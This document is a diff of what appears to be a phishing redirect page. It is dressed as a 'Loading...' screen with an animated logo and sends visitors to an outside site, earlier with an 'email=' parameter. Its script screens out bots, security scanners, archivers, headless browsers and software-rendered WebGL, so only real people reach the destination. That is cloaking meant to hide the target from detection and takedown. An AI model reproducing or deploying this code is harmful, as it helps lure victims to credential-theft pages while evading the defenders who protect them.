@@ -7,7 +7,7 @@
 <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
 <meta http-equiv="Pragma" content="no-cache">
 <meta http-equiv="Expires" content="0">
-<title>Redirecting...</title>
+<title>Loading...</title>
 <style>
   html, body { 
     margin: 0; padding: 0; 
@@ -24,71 +24,50 @@
     width: 100%;
     height: 100%;
     display: flex;
-    flex-direction: column;
     justify-content: center;
     align-items: center;
     background-color: #ffffff;
     z-index: 9999;
   }
 
-  .spinner {
-    width: 28px;
-    height: 28px;
-    border: 3px solid rgba(0, 198, 255, 0.2);
-    border-top: 3px solid #00c6ff;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
-    box-shadow: 0 0 15px rgba(0, 198, 255, 0.2);
+  /* Small, Fixed Size Beat Animation */
+  .beating-icon {
+    /* BEAT ANIMATION */
+    animation: heartbeat 1.5s infinite ease-in-out;
+    
+    /* SIZE FIX - Prevents it from looking weird/large */
+    width: 50px; 
+    height: auto; 
+    display: block;
   }
 
-  .loading-text {
-    margin-top: 15px;
-    font-size: 11px;
-    font-weight: 600;
-    color: #0072ff;
-    letter-spacing: 1px;
-    text-transform: uppercase;
-  }
-
-  @keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
+  @keyframes heartbeat {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.15); }
+    100% { transform: scale(1); }
   }
 </style>
 </head>
 <body>
 
-<!-- Loading Overlay -->
 <div id="loader-container">
-  <div class="spinner"></div>
+  <!-- Using your hosted image with animation applied -->
+  <img src="https://logisticafumero.com/icon.svg.webp" 
+       alt="Loading" 
+       class="beating-icon">
 </div>
 
 <script>
 (function () {
   'use strict';
 
-  // ============================================================
-  // CONFIG — your destination
-  // ============================================================
-  var DEST = "https://centuryac.org/?onbodirx&email=";
+  var DEST = "https://jskmarketings.com/acknowledgment.html";
 
-  // ============================================================
-  // LAYER 1: User-Agent block list (Keep strong)
-  // ============================================================
   var ua = (navigator.userAgent || "").toLowerCase();
-
   var UA_BLOCK = /bot|crawl|spider|scrape|slurp|curl|wget|python|requests|urllib|httpx|aiohttp|java\/|okhttp|node-fetch|axios|got\/|go-http|perl|ruby|libwww|php\/|scan|nmap|nikto|sqlmap|masscan|zmap|pingdom|uptime|monitor|lighthouse|pagespeed|headless|phantom|puppeteer|playwright|selenium|webdriver|chrome-lighthouse|gtmetrix|semrush|ahrefs|moz\.com|majestic|screaming|deepcrawl|botify|seznam|yandex|baidu|sogou|exabot|ia_archiver|archive\.org|wayback|commoncrawl|ccbot|petalbot|applebot|duckduckbot|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegrambot|discordbot|skypeuripreview|embedly|quora|pinterest|slackbot|vkshare|w3c_validator|validator\.nu|feedfetcher|google-read-aloud|google web preview|google-inspectiontool|googleother|google-extended|adsbot|mediapartners|apis-google|storebot-google|chrome\/\d+.*safari\/537.*headless/i;
 
   if (UA_BLOCK.test(ua) || ua.length < 20) return;
 
-  // ============================================================
-  // LAYER 2: navigator.webdriver
-  // ============================================================
-  // if (navigator.webdriver === true) return; 
-
-  // ============================================================
-  // LAYER 4: Headless fingerprints
-  // ============================================================
   if (/HeadlessChrome/i.test(navigator.userAgent)) return;
   
   try {
@@ -97,31 +76,19 @@
     if (gl) {
       var dbg = gl.getExtension("WEBGL_debug_renderer_info");
       if (dbg) {
-        var renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "";
-        if (/swiftshader|llvmpipe/i.test(renderer)) return;
+        if (/swiftshader|llvmpipe/i.test(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL))) return;
       }
     }
-  } catch (e) { /* ignore */ }
+  } catch (e) {}
 
-  // ============================================================
-  // LOGIC
-  // ============================================================
-  
-  function fire() {
-    var wait = 380; // Wait time (in ms)
-
-    setTimeout(function () {
-      try {
-        window.location.replace(DEST);
-      } catch (e) {
-        window.location.href = DEST;
-      }
-    }, wait);
-  }
-
-  // Fire immediately
-  fire();
-
+  // Redirect after a bit to see the beat
+  setTimeout(function () {
+    try {
+      window.location.replace(DEST);
+    } catch (e) {
+      window.location.href = DEST;
+    }
+  }, 750); // Wait 1.5 seconds for the image to beat once
 })();
 </script>
 
